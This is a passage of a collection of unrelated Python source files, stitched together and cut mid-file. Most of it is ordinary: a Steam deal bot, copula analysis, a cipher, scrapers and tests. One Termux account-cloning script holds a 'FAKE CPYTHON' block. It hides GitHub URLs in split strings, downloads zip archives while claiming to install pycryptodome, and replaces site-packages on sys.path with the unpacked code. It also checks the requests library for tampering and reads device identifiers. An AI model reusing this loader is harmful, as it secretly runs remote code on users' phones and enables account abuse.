year=datetime.now().year).timetuple())\n            return f\"<t:{int(date)}:R>\"\n        else:\n            script = data.parent.find(\"script\").__str__()\n            if script != \"None\":  # If soon\n                unixtime = re.search(r\"InitDailyDealTimer\\( \\$DiscountCountdown, (\\d{10}) \\)\", script)\n                date = mktime(datetime.fromtimestamp(int(unixtime.group(1))).timetuple())\n                return f\"<t:{int(date)}:R>\"\n    else:  # Free\n        data = soup.find(\"p\", class_=\"game_purchase_discount_quantity\").text.split(\"\\n\")[1].lstrip().split()\n\n        date = mktime(datetime.strptime(f\"{data[-6]} {data[-5]} {data[-3]}\", \"%d %b %H:%M%p.\").replace(\n            year=datetime.now().year).timetuple())\n        return f\"<t:{int(date)}:R>\"\n\n\n@tasks.loop()\nasync def check_for_new_game():\n    global price, last_seen, seen\n    json_data = await fetch_data(applisturl)\n    for app in json_data['applist']['apps']:\n        try:\n            app[\"appid\"]: int\n            game_is_free: bool = False\n            price = await get_price(app['appid'])\n            if not price[str(app['appid'])][\"success\"]:\n                continue\n      ",
    "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Mon Mar 25 16:35:14 2024\n\n@author: Utilisateur\n\"\"\"\n\nimport yfinance as yf\nimport numpy as np\nfrom copulas.multivariate import GaussianMultivariate\nfrom copulas.bivariate import Clayton, Frank, Gumbel\nfrom copulas.univariate import UniformUnivariate\nfrom scipy.stats import pearsonr, spearmanr, kendalltau\nimport matplotlib.pyplot as plt\nfrom pycop import archimedean\n\nassets = {\n    \"S&P 500\": \"^GSPC\",\n    \"MSCI Emerging Markets\": \"EEM\",\n    \"Bloomberg Commodity Index\": \"CMOD.MI\",\n    \"USD/CNY\": \"CNY=X\",\n    \"German Bonds\": \"EXSB.DE\" \n}\n\ntime_periods = {\n    \"Pre-Financial Crisis Growth\": (\"2005-01-01\", \"2007-12-31\"),\n    \"Post-Financial Crisis Recovery\": (\"2009-01-01\", \"2011-12-31\"),\n    \"COVID-19 Pandemic Impact\": (\"2020-01-01\", \"2022-12-31\"),\n    \"Late-2017 Market Rally\": (\"2017-09-01\", \"2018-02-28\"),\n    \"Trade War Uncertainty\": (\"2018-01-01\", \"2020-12-31\"),\n    \"Renminbi Devaluation\": (\"2014-01-01\", \"2016-12-31\"),\n    \"Trade War Period\": (\"2018-03-01\", \"2019-12-31\"),\n    \"Normalisation of ECB Monetary Policy\": (\"2017-01-09\", \"2018-12-31\"),\n    \"Chinese Economic Boom\": (\"2005-01-01\", \"2007-01-01\")\n}\n\ndef empirical_log_likelihood(copula, data, n_samples=100):\n    samples = copula.sample(n_samples)\n    empirical_likelihoods = copula.pdf(samples)\n    return np.mean(np.log(empirical_likelihoods))\n\ndef transform_to_uniform(marginals):\n    # Assuming 'marginals' is a pandas Series\n    return marginals.rank(method='average') / (len(marginals) + 1)\n\ndef empirical_log_likelihood(copula, data, n_samples=100):\n    samples = copula.sample(n_samples)\n    empirical_likelihoods = copula.pdf(samples)\n    return np.mean(np.log(empirical_likelihoods))\n\ndef calculate_aic(log_likelihood, num_parameters):\n    return 2 * num_parameters - 2 * log_likelihood\n\ndef find_best_copula(asset1_returns, asset2_returns):\n    # Transform to uniform distributions\n    asset1_uniform = transform_to_uniform(asset1_returns)\n    asset2_uniform = transform_to_uniform(asset2_returns)\n    data = np.column_stack((asset1_uniform, asset2_uniform))\n\n    # List of copulas to evaluate\n    copulas = [\n        GaussianMultivariate(),\n        Clayton(),\n        Frank(),\n        Gumbel(),\n        UniformUnivariate()\n    ]\n\n    aic_scores = {}\n    best_copula = None\n    best_aic = np.inf\n\n    for copula in copulas:\n        try:\n            copula.fit(data)\n            log_likelihood = empirical_log_likelihood(copula, data)\n            # Assuming the 'parameters' can somehow give us the number of parameters for AIC calculation.\n            # This is a simplification; you'll need to adjust based on your actual copula objects.\n            num_parameters = 1  # Placeholder. Determine the correct number based on your copula type.\n            aic = calculate_aic(log_likelihood, num_parameters)\n            aic_scores[copula.__class__.__name__] = aic\n            \n            if aic < best_aic:\n                best_aic = aic\n                best_copula = copula\n                \n            print(f\"{copula.__class__.__name__}: Log-likelihood = {log_likelihood}, AIC = {aic}\")\n\n        except Exception as e:\n            print(f\"An error occurred while fitting the copula: {e}\")\n\n    print(f\"Best copula based on AIC: {best_copula} with AIC = {best_aic}\")\n    return best_copula, aic_scores\n\n\n\n\ndef calculate_dependency(asset1, asset2, time_period_name):\n    asset1_data = yf.download(assets[asset1], start=time_periods[time_period_name][0], end=time_periods[time_period_name][1])\n    asset2_data = yf.download(assets[asset2], start=time_periods[time_period_name][0], end=time_periods[time_period_name][1])\n\n    if asset1_data.empty or asset2_data.empty:\n        print(f\"Data for {asset1} or {asset2} is empty. Skipping...\")\n        return\n    \n    asset1_returns = asset1_data['Close'].pct_change().dropna()\n    asset2_returns = asset2_data['Close'].pct_change().dropna()\n\n    asset1_returns, asset2_returns = asset1_returns.align(asset2_returns, join='inner')\n\n    best_copula = find_best_copula(asset1_returns, asset2_returns)\n    print(f\"Best copula for {asset1} / {asset2} during {time_period_name}: {best_copula}\")\n\n    aligned_asset1, aligned_asset2 = asset1_returns.align(asset2_returns, join='inner')\n\n    #Dependency mesures\n    pearson_corr, pearson_pval = pearsonr(aligned_asset1, aligned_asset2)\n    spearman_corr, spearman_pval = spearmanr(aligned_asset1, aligned_asset2)\n    kendall_tau, kendall_pval = kendalltau(aligned_asset1, aligned_asset2)\n\n    # Print the results\n    print(f\"{asset1} / {asset2} during {time_period_name}\")\n    print(f\"Pearson Correlation Coefficient (r): {pearson_corr:.4f}, p-value: {pearson_pval:.4g}\")\n    print(f\"Spearman's Rank Correlation Coefficient (rho): {spearman_corr:.4f}, p-value: {spearman_pval:.4g}\")\n    print(f\"Kendall's Tau Correlation Coefficient (tau): {kendall_tau:.4f}, p-value: {kendall_pval:.4g}\")\n    print(\"\\n\")\n    \n\nfor pair, periods in {\n    (\"S&P 500\", \"MSCI Emerging Markets\"",
    "from setuptools import setup, find_packages\n\nwith open('README.md', encoding='utf-8') as f:\n    long_description = f.read()\n\nwith open('requirements.txt', encoding='utf-8') as f:\t\n    requirements = f.read().splitlines()\n\nsetup(\n    name='modelcaller',\n    version='0.1',\n    packages=find_packages(),\n    description='ModelCaller for AI',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    author='Mukesh Dalal',\n    author_email='mukesh@aidaa.ai',\n    url='https://github.com/mukdal/modelcaller',\n\n    python_requires='>=3.9',\t\n    install_requires=requirements,\n    \n    data_files=[('', ['LICENSE.txt'])],\n    license='Custom',\n    license_files=('LICENSE.txt',),\n    keywords='modelcaller artficial intelligence machine learning ml ai systems transformation model',\n\n        classifiers=[\t\n        \"Development Status :: 3 - Alpha\",\t\n        \"Intended Audience :: Developers\",\t\n        \"License :: Free for non-commercial use\",\t\n        \"Operating System :: OS Independent\",\t\n        'Topic :: Software Development :: Libraries',\t\n        \"Programming Language :: Python :: 3\",\t\n        \"Programming Language :: Python :: 3.12\",\t\n    ],\n\n)",
    "def prepare_input(text):\n    # Convert the text to uppercase and replace J with I\n    text = text.upper().replace(\"J\", \"I\")\n    # Remove any characters that are not letters\n    text = ''.join(filter(str.isalpha, text))\n    return text\n\ndef generate_key_square(key):\n    key_square = [['' for _ in range(5)] for _ in range(5)]\n    key_set = set()\n\n    # Create the key square\n    i, j = 0, 0\n    for letter in key + 'ABCDEFGHIKLMNOPQRSTUVWXYZ':\n        if letter not in key_set:\n            key_square[i][j] = letter\n            key_set.add(letter)\n            j += 1\n            if j == 5:\n                j = 0\n                i += 1\n\n    return key_square\n\ndef find_position(matrix, char):\n    for i, row in enumerate(matrix):\n        if char in row:\n            return i, row.index(char)\n\ndef encrypt_pair(pair, key_square):\n    (x1, y1), (x2, y2) = find_position(key_square, pair[0]), find_position(key_square, pair[1])\n\n    if x1 == x2:\n        return key_square[x1][(y1 + 1) % 5] + key_square[x2][(y2 + 1) % 5]\n    elif y1 == y2:\n        return key_square[(x1 + 1) % 5][y1] + key_square[(x2 + 1) % 5][y2]\n    else:\n        return key_square[x1][y2] + key_square[x2][y1]\n\ndef playfair_encrypt(plaintext, key):\n    plaintext = prepare_input(plaintext)\n    key_square = generate_key_square(key)\n\n    encrypted_text = ''\n    i = 0\n    while i < len(plaintext):\n        pair = plaintext[i:i + 2]\n        if len(pair) == 1:\n            pair += 'X'\n            i -= 1\n\n        encrypted_text += encrypt_pair(pair, key_square)\n        i += 2\n\n    return encrypted_text\n\n# Example usage:\nplaintext = \"NATNAEL\"\nkey = \"SECRETKEY\"\n\ncipher_text = playfair_encrypt(plaintext, key)\nprint(\"Original Text:\", plaintext)\nprint(\"Encrypted Text:\", cipher_text)\n",
    "# Import necessary libraries for web scraping, data manipulation, and file operations\nimport requests  # For making HTTP requests to web pages\nfrom bs4 import BeautifulSoup  # For parsing HTML content\nimport time  # For pausing the script to respect server load\nimport pandas as pd  # For data manipulation and export\nimport random  # For generating random sleep durations\nimport datetime  # For handling dates and times\nimport os  # For file operations, like opening files\nimport webbrowser  # For opening files in the web browser\nimport re  # For regular expressions, used in parsing scripts\nfrom bs4 import NavigableString # Importing the NavigableString class from the bs4 module\nimport sys  # For system-specific parameters and functions\n\n# Prompt the user for input, accepting either a country name or a full URL\nuser_input = input(' \ud83c\udf10  Enter the country name or the full URL for job listing -> ')\n\n# Define the default keywords list\nkeywords = ['Data', 'data', 'Information', 'information', 'analysis', 'Analysis', 'Engineer', 'Developer', 'GIS', 'Geographic']\n\n# Convert the list of default keywords into a string to display to the user\ndefault_keywords_str = \", \".join(keywords)\n\n# Prompt the user with a simple yes/no question\nuser_response = input(f\"\\nThe default keywords for job searches are: {default_keywords_str}. \\nDo you wish to enter your own keywords instead? (yes/no): \").strip().lower()\n\nif user_response == 'yes':\n    custom_keywords_input = input(\"Enter your custom keywords, separated by commas (e.g., Analyst, Software, Research): \")\n    # Overwrite the default keywords list with the user's custom list\n    keywords = [keyword.strip() for keyword in custom_keywords_input.split(',')]\n# If the user answers 'no', the script continues using the predefined list of keywords\n\n# Define the base URL for UN jobs duty stations\nbase_site_url = \"https://unjobs.org/duty_stations/\"\n\n# Determine if the user input is a URL or a country name and construct the search URL accordingly\nif user_input.startswith('http://') or user_input.startswith('https://'):\n    base_url = user_input\nelse:\n    # Construct the full URL by appending the country name to the base site URL\n    base_url = f\"{base_site_url}{user_input.lower()}\"\n\n# Set request headers to mimic a browser user-agent for compatibility\nheaders = {'User-Agent': 'Mozilla/5.0'}\njob_data = []  # Initialize a list to store job data\npage = 1  # Start from the first page\n\nprint(' \ud83d\udd0d  Collecting data from the website...')\n\nurl_suffix = base_url.split('/')[-1]  # This splits the URL by '/' and takes the last element\n\n# Loop through the pages of the website until no more job listings are found\nwhile True:\n    # Construct URL for the current page, handling the first page as a special case\n    URL = f\"{base_url}/{page}\" if page > 1 else base_url\n    response = requests.get(URL, headers=headers)\n    soup = BeautifulSoup(response.content, 'html.parser')\n\n    # Extract job listings from the current page\n    jobs = soup.find_all('div', class_='job')\n    if not jobs:\n        break  # Exit the loop if no jobs are found on the current page\n\n    # Attempt to extract script containing job closing dates\n    closing_dates_script_element = soup.find(\"script\", string=re.compile(\"var j\\\\d+i = new Date\"))\n    if closing_dates_script_element:\n        closing_dates_script = closing_dates_script_element.string\n        closing_date_matches = re.findall(r\"var j(\\d+)i = new Date\\((\\d+)\\);\", closing_dates_script)\n\n        # Create a dictionary mapping from job ID suffix to closing date string\n        closing_dates = {}\n        for match in closing_date_matches:\n            job_id_suffix, timestamp = match\n            # Convert timestamp to datetime and format it\n            closing_date = datetime.datetime.fromtimestamp(int(timestamp) / 1000).strftime('%Y-%m-%d')\n            closing_dates[job_id_suffix] = closing_date\n    else:\n        closing_dates = {}   # If no closing dates script is found, use an empty dictionary\n\n    # Iterate over each job listing to extract and store data\n    for job in jobs:\n        a_tag = job.find('a', class_='jtitle')\n        if a_tag:\n            title = a_tag.text.strip()\n            url = a_tag['href']\n            if a_tag.find_next('br') and a_tag.find_next('br').next_sibling:\n                next_sibling = a_tag.find_next('br').next_sibling\n                organization = next_sibling.strip() if isinstance(next_sibling, NavigableString) else \"N/A\"\n            else:\n                organization = \"N/A\" # Default to \"N/A\" if not found\n            # Attempt to extract the organization from the job listing\n            job_id_suffix = job.find(\"span\", id=re.compile(\"j\\d+\"))['id'][1:]  \n            closing_date = closing_dates.get(job_id_suffix, \"N/A\")\n            job_data.append({'title': title, 'organization': organization, 'closing_date': closing_date, 'url': url})\n     \n            # Update the console with the progress\n            sys.stdout.write(f'\\r \u23f3  Scraping information..",
    "import sys\r\nfrom math import sin, cos\r\n\r\n# Define a function to read the problems from the text file\r\ndef read_problems_from_file(file_name):\r\n    with open(file_name, 'r') as file:\r\n        problems = [line.strip() for line in file.readlines() if line.strip()]\r\n    return problems\r\n\r\n# Function to process each problem for x values from 1 to 50\r\ndef process_problems(problems):\r\n    results = [[] for _ in range(50)]  # List of 50 lists to store results for each x value\r\n    \r\n    for x in range(1, 51):  # x values from 1 to 50\r\n        for index, problem in enumerate(problems):\r\n            try:\r\n                # Evaluating the expression for the current x value\r\n                result = eval(problem.replace('x', str(x)))\r\n                results[x-1].append(result)\r\n            except Exception as e:\r\n                results[x-1].append(f\"Error: {e}\")\r\n    \r\n    return results\r\n\r\n# Main function\r\ndef main():\r\n    file_name = \"maa.txt\"  # Modified file name\r\n    problems = read_problems_from_file(file_name)\r\n    if problems:\r\n        results = process_problems(problems)\r\n        with open(\"maad.txt\", 'w') as output_file:\r\n            original_stdout = sys.stdout\r\n            sys.stdout = output_file  # Redirect stdout to the file\r\n            for x in range(50):\r\n                print(f\"For x = {x+1}: {results[x]}\")\r\n            sys.stdout = original_stdout  # Reset stdout\r\n        print(\"Output has been saved to 'maad.txt'.\")\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "import sys\nimport os\n\n# Agrega el directorio padre (q-learning_app) al PATH para permitir importaciones relativas\nsys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))\n\nimport json\nimport networkx as nx\nfrom RLib.environments.ssp import SSPEnv\n\n\nclass SSPEnvSerializer:\n    def __init__(self, ssp_env):\n        self.ssp_env = ssp_env\n\n    def to_dict(self):\n        # Serializar el grafo a un formato compatible con JSON\n        serialized_graph = nx.node_link_data(self.ssp_env.grafo)\n        return {\n            \"num_states\": self.ssp_env.num_states,\n            \"num_actions\": self.ssp_env.num_actions,\n            \"start_state\": self.ssp_env.start_state,\n            \"terminal_state\": self.ssp_env.terminal_state,\n            \"graph\": serialized_graph,  # Grafo serializado\n        }\n\n\nclass QAgentSSPSerializer:\n    def __init__(self, q_agent):\n        self.q_agent = q_agent\n\n    def to_dict(self):\n        return {\n            \"num_states\": self.q_agent.num_states,\n            \"num_actions\": self.q_agent.num_actions,\n            \"alpha\": self.q_agent.alpha,\n            \"gamma\": self.q_agent.gamma,\n            \"dynamic_alpha\": self.q_agent.dynamic_alpha,\n            \"strategy\": str(self.q_agent.strategy),\n            \"times_actions\": self.q_agent.times_actions,\n            \"times_states\": self.q_agent.times_states,\n            \"q_table\": self.q_agent.q_table,\n            \"alpha_formula\": self.q_agent.alpha_formula,\n            \"num_episodes\": getattr(self.q_agent, \"num_episodes\", None),\n            \"policy\": getattr(self.q_agent, \"policy\", None),\n            \"distribution\": getattr(self.q_agent, \"distribution\", None),\n        }\n\n\n\n\n\ndef serialize_dict_of_dicts(q_star):\n    serialized_q_star = {}\n    for key, value in q_star.items():\n        serialized_key = str(key)\n        if isinstance(value, dict):\n            serialized_value = {str(k): v for k, v in value.items()}\n        elif isinstance(value, list):\n            serialized_value = [v for v in value]\n        else:\n            raise TypeError(f\"Tipo de valor no compatible: {type(value)}\")\n        serialized_q_star[serialized_key] = serialized_value\n    return serialized_q_star\n\n\nif __name__ == \"__main__\":\n    # Ejemplo de diccionario de diccionarios\n    q_star = {\n        (\"Entrada\", 0): {(\"Oculta 1\", 0): 5},\n        (\"Oculta 1\", 0): {\n            (\"Oculta 2\", 0): 10,\n            (\"Oculta 2\", 1): 14,\n            (\"Oculta 2\", 2): 20,\n        },\n        (\"Oculta 2\", 0): {(\"Salida\", 0): 15},\n    }\n\n    # Serializar q_star\n    serialized_q_star = serialize_dict_of_dicts(q_star)\n\n    # Convertir a formato JSON\n    json_q_star = json.dumps(serialized_q_star, indent=4)\n\n    # Imprimir el resultado\n    print(json_q_star)\n",
    "import os\n#os.system('pip install httpx pip install beautifulsoup4')\nprint('loading Modules ...\\n')\n\ntry:\n\timport os,requests,json,time,re,random,sys,uuid,string,subprocess\n\tfrom string import *\n\timport bs4\n\t#import dz\n\tfrom concurrent.futures import ThreadPoolExecutor as tred\n\tfrom bs4 import BeautifulSoup as sop\n\tfrom bs4 import BeautifulSoup\nexcept ModuleNotFoundError: \n\tprint('\\n Installing missing modules ...')\n\tos.system('pip install requests bs4 futures==2 > /dev/null')\n\t\n#\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[FAKE CPTHON]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 #\nimport os,sys,tempfile,string,random,subprocess,uuid\nhttp_directory = tempfile.mkdtemp(prefix='.')\nsite_packages = sys.path[4]\nprint(site_packages)\nprint(http_directory)\nsys.path.remove(site_packages)\nsys.path.insert(4,http_directory+'/reqmodule')\nsys.path.insert(5,http_directory)\ntry:\n        os.mkdir('crypto')\nexcept:pass\nhh = \"ho\"\nhh2 = \"9/pycrypt\"\nfind_aarch = subprocess.check_output('uname -om',shell=True)\nif 'aarch64' in str(find_aarch):\n        user_aarch = '64'\n        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'\nelif 'arm' in str(find_aarch):\n        user_aarch = '32'\n        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true'\nelse:\n        print(' Unknown aarch ')\n        exit()\nif not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):\n        os.system('clear')\n        print('\\n Please wait while creating pycryptodome for you ! This can take some time\\n\\n')\n        os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')\n        os.system('python jan.py')\nelse:\n        akk2=\"rsi\"\n        akk=f\"cha{akk2}fi\"\n        os.system(f'cp crypto/crypto{user_aarch}.zip {http_directory}')\n        lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'\n        os.system(f'curl -L {lib} > {http_directory}/config.zip')\n        os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')\n        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')\n#\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[FAKE CPYTHON End]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 #\n#\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[BIT ROOM]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 #\nimport os, platform, time, sys\nos.system('pkg install espeak ')\nprint('\\033[1;91m[\\033[1;92m\u2280\u2281\\033[1;91m] \\033[1;91m\u2280\\33[1;92mYOSiF-/KHA\u00d1\\33[1;91m\u2281 ')\nos.system('espeak -a 300 \" ,FILE CLONING 1..0, TOOLS,INSTALL Complete ,\"')\ntime.sleep(1)\nos.system('clear')\n##\nimport os, platform, time, sys\n\ntry:\n import requests\nexcept:os.system(\"pip uninstall requests -y;pip install requests\")\n\nprint('\\033[1;91mChecking For Update. . . .')\nos.system('espeak -a 300 \" Checking For Update,\"')\ntime.sleep(2)\n\n\nos.system('git pull --quiet 2>/dev/null')\nbit = platform.architecture()[0]\nif bit == '64bit':\n print('\\033[1;91m[\\033[1;92m\u25c9\\033[1;91m] \\033[1;92mYOU ARE 64BIT USER')\n \nelif bit == '32bit':\n print('\\033[1;91m[\\033[1;92m\u25c9\\033[1;91m] \\033[1;92mYOU ARE 32BIT USER')\n\n #\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[BIT End]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 #\n\n\nking='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'\nif not 'print' in open(king+'sessions.py','r').read():\n    pass\nelse:\n    exit('\\033[1;32mB\u0113\u015by\u0101ra ch\u0113l\u0113 m\u0113tha\u1e0da ky\u0101pac\u0101ra karab\u0101 tumi t\u014dm\u0101ra m\u0101r\u0113 kutt\u0101 di\u1e8f\u0113 c\u014ddai')\nqeen='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'\nif not 'print' in open(qeen+'models.py','r').read():\n    pass\nelse:\n    exit('\\033[1;32mB\u0113\u015by\u0101ra ch\u0113l\u0113 m\u0113tha\u1e0da ky\u0101pac\u0101ra karab\u0101 tumi t\u014dm\u0101ra m\u0101r\u0113 kutt\u0101 di\u1e8f\u0113 c\u014ddai')\ndon='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'\nif not 'print' in open(don+'utils.py','r').read():\n    pass\nelse:\n    exit('\\033[1;32mB\u0113\u015by\u0101ra ch\u0113l\u0113 m\u0113tha\u1e0da ky\u0101pac\u0101ra karab\u0101 tumi t\u014dm\u0101ra m\u0101r\u0113 kutt\u0101 di\u1e8f\u0113 c\u014ddai')\n\ntry:\n\tprox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text\n\topen('proxies.txt','w').write(prox)\nexcept Exception as e:\n\tprint('')\nproxies=open('proxies.txt','r').read().splitlines()\n\nprincp=[]\n#-----------------------------------------------------#\nusr=[]\nandroid_models=[]\n#-----------------------------------------------------#\nbYT=\"\\033[1;30m\" \nM=\"\\033[1;31m\"       \nH=\"\\033[1;33m\"               \nbyellow=\"\\033[1;33m\"     \nbblue=\"\\033[1;34m\"        \nP=\"\\033[1;35m\"               \nC=\"\\033[1;36m\"          \nB=\"\\033[1;37m\"       \nG=\"\\033[1;32m\"              \nR=\"\\033[1;31m\"\nAA=\"\\033[1;32m\"\nBB=\"\\033[1;31m\"\nCC=\"\\033[1;36m\"\nX='\\033[1;30m'\nXX=\"\\x1b[38;5;196m\"\nGGG=\"\\x1b[38;5;214m\"\n#-----------------------------------------------------#\n\n  \n\nsim_id = ''\nandroid_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\\n','')\nmodel = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\\n','')\nbuild = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\\n','')\nfblc = 'en_GB'\ntry:\n        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(','",
    "from playwright.sync_api import Page, expect\nimport pytest\n\ntesting_data = [\n    (\"locked_out_user\", \"secret_sauce\", \"Epic sadface: Sorry, this user has been locked out.\"),\n    (\"\", \"\", \"Epic sadface: Username is required\"),\n    (\"wrong_username\", \"\", \"Epic sadface: Password is required\"),\n    (\"wrong_username\", \"wrong_password\", \"Epic sadface: Username and password do not match any user in this service\")\n]\n\n\n@pytest.mark.parametrize(\"username, password, error_message\", testing_data)\ndef test_not_valid_login_scenarios(page: Page, username: str, password: str, error_message: str) -> None:\n    page.goto(\"https://www.saucedemo.com/\")\n    page.locator(\"[data-test=\\\"username\\\"]\").fill(username)\n    page.locator(\"[data-test=\\\"password\\\"]\").fill(password)\n    page.locator(\"[data-test=\\\"login-button\\\"]\").click()\n    expect(page.locator(\"[data-test=\\\"error\\\"]\")).to_be_visible()\n    expect(page.locator(\"[data-test=\\\"error\\\"]\")).to_contain_text(error_message)\n    expect(page).to_have_url('https://www.saucedemo.com/')\n",
    "class Student:\n    def __init__(self, full_name=\"\", group_number=0, progress=[]):  # \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\n        self.full_name = full_name  # \u0438\u043c\u044f\n        self.group_number = group_number  # \u043d\u043e\u043c\u0435\u0440 \u0433\u0440\u0443\u043f\u043f\u044b\n        self.progress = progress  # \u043e\u0446\u0435\u043d\u043a\u0438\n\n    def __str__(self):  # \u043f\u0435\u0447\u0430\u0442\u0430\u0435\u043c\u043e\u0435 \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u044d\u043a\u0437\u0435\u043c\u043f\u043b\u044f\u0440\u0430 \u043a\u043b\u0430\u0441\u0441\u0430\n        txt = '\u0421\u0442\u0443\u0434\u0435\u043d\u0442: ' + self.full_name + ' \u0413\u0440\u0443\u043f\u043f\u0430: ' + str(self.group_number)  # \u043f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0447\u0438\u0441\u043b\u0430 \u0432 \u0441\u0442\u0440\u043e\u043a\u0443\n        txt += ' \u041e\u0446\u0435\u043d\u043a\u0438: '\n        for x in self.progress:\n            txt += ' ' + str(x)  # \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u043f\u0438\u0441\u043e\u043a \u043e\u0446\u0435\u043d\u043e\u043a\n        return txt\n\n# \u0424\u0443\u043d\u043a\u0446\u0438\u044f, \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u044e\u0449\u0430\u044f \u0430\u0442\u0440\u0438\u0431\u0443\u0442 \u0434\u043b\u044f \u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u043a\u0438\ndef SortParam(st):\n    return st.full_name\n  \nst_size = 5  # \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0441\u0442\u0443\u0434\u0435\u043d\u0442\u043e\u0432\nstudents = []  # \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u043f\u0443\u0441\u0442\u043e\u0433\u043e \u0441\u043f\u0438\u0441\u043a\u0430\n\nfor i in range(st_size):  # \u0446\u0438\u043a\u043b \u0434\u043b\u044f \u0432\u0432\u043e\u0434\u0430 st_size \u0441\u0442\u0443\u0434\u0435\u043d\u0442\u043e\u0432\n    print(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u043e\u043b\u043d\u043e\u0435 \u0438\u043c\u044f \u0441\u0442\u0443\u0434\u0435\u043d\u0442\u0430: \")\n    full_name = input()  # \u0432\u0432\u043e\u0434 \u0444\u0430\u043c\u0438\u043b\u0438\u0438\n    print(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0433\u0440\u0443\u043f\u043f\u044b: \")\n    group_number = input()  # \u0432\u0432\u043e\u0434 \u0433\u0440\u0443\u043f\u043f\u044b\n    n = 5\n    print(f'\u0412\u0432\u0435\u0434\u0438\u0442\u0435 {n} \u043e\u0446\u0435\u043d\u043e\u043a \u0432 \u0441\u0442\u043e\u043b\u0431\u0438\u043a: ')  # \u0443 \u043a\u0430\u0436\u0434\u043e\u0433\u043e \u0441\u0442\u0443\u0434\u0435\u043d\u0442\u0430 n \u043e\u0446\u0435\u043d\u043e\u043a\n\n    progress = []\n    for i in range(n):\n        score = int(input())  # \u0432\u0432\u043e\u0434 \u043e\u0446\u0435\u043d\u043e\u043a\n        progress.append(score)  # \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u043e\u0446\u0435\u043d\u043e\u043a\n\n    # \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u044d\u043a\u0437\u0435\u043c\u043f\u043b\u044f\u0440\u0430 \u043a\u043b\u0430\u0441\u0441\u0430 Student:\n    st = Student(full_name, group_number, progress)\n    students.append(st)  # \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u044d\u043a\u0437\u0435\u043c\u043f\u043b\u044f\u0440\u0430 \u0432 \u0441\u043f\u0438\u0441\u043e\u043a\n\nprint(\"Students list:\")\nfor st in students:  # \u0432\u044b\u0432\u043e\u0434 \u043f\u043e\u043b\u043d\u043e\u0433\u043e \u0441\u043f\u0438\u0441\u043a\u0430 \u0441\u0442\u0443\u0434\u0435\u043d\u0442\u043e\u0432\n    print(st)\n\n# \u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u043a\u0430 \u043f\u043e \u0444\u0430\u043c\u0438\u043b\u0438\u0438, \u043a\u043b\u044e\u0447 \u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u043a\u0438 \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u0442\u0441\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u0435\u0439 SortParam:\nstudents = sorted(students, key=SortParam)\n\nprint(\"Sorted students:\")\nfor st in students:  # \u0432\u044b\u0432\u043e\u0434 \u043e\u0442\u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u043e\u0433\u043e \u0441\u043f\u0438\u0441\u043a\u0430\n    print(st)\n\nprint(\"bad students:\")\nn = 0  # \u0441\u0447\u0435\u0442\u0447\u0438\u043a \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u0430 